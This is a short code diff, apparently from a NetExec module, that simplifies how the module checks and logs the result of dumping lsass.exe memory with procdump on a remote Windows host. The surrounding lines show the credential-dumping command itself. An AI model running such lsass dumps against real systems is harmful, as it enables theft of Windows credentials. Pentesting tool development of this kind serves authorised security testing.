@@ -70,18 +70,13 @@ class NXCModule:
         command = f"{self.tmp_dir}{self.procdump} -accepteula -ma {pid} {self.tmp_dir}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
         context.log.display(f"Executing command {command}")
         p = connection.execute(command, True)
-        context.log.debug(p)
-        dump = False
-        if "Dump 1 complete" in p:
-            context.log.success("Process lsass.exe was successfully dumped")
-            dump = True
-        else:
-            context.log.fail("Process lsass.exe error while dumping, try with verbose")
 
-        if not dump:
+        if "Dump 1 complete" not in p:
+            context.log.fail("Process lsass.exe error while dumping, try with verbose")
             self.delete_procdump_binary(connection, context)
             return
         else:
+            context.log.success("Process lsass.exe was successfully dumped")
             regex = r"([A-Za-z0-9-]*.dmp)"
             matches = re.search(regex, str(p), re.MULTILINE)
             machine_name = ""
